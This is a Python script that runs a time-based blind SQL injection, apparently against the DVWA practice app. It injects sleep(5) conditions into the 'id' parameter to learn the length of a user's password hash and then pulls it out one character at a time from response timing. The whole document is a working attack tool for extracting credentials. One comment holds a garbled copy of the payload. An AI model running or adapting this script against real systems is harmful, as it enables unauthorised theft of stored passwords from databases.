import requests
import sys
import re
from tqdm import tqdm
import time

# config section #################
if(len(sys.argv) <= 1):
    print('You need attacks\'s url!')
    sys.exit()

args = sys.argv
url = args[1]
cookie ={
        "security":"low",
        "PHPSESSID":"c4gctt33ospgginn5pop4re9rp"
        }

# make sure password's count ###################################
for i in tqdm(range(1,100)):
    t1 = time.time()
    sql = '1\' and if((select length(password) from users where user_id =1) ={counter},sleep(5),0);#'.format(counter =i)
    payload = {
            "id":sql ,
            "Submit" : "Submit"
    }
   
    response = requests.get(url,params=payload,cookies=cookie) 
    t2 = time.time()
    elapsed_time = t2-t1
    if elapsed_time > 5:
        break
# make sure password ################################
print('password\'s word length: {count}'.format(count=i))
for index in tqdm(range(1,i)):
    for char_number in range(48,123):
        t1 = time.time()
        char = chr(char_number)
        sql = '1\' and if(substring((select password from users where user_id =1) ,{index},1)= binary \'{char}\',sleep(5),0);#'.format(index=index,char=char)
        #     '1 and if (substring((select password from users where user_id =1),?mojime)1)=binary ?,sleep(5),9);#
        #      true then wait 5 seconds  else fast response
        payload = {
                "id":sql ,
                "Submit" : "Submit"
         }

        response = requests.get(url,params=payload,cookies=cookie)
        t2 = time.time()
        elapsed_time = t2-t1
        if elapsed_time > 5:
            
            print(char,end='')
            break
print("")     

    
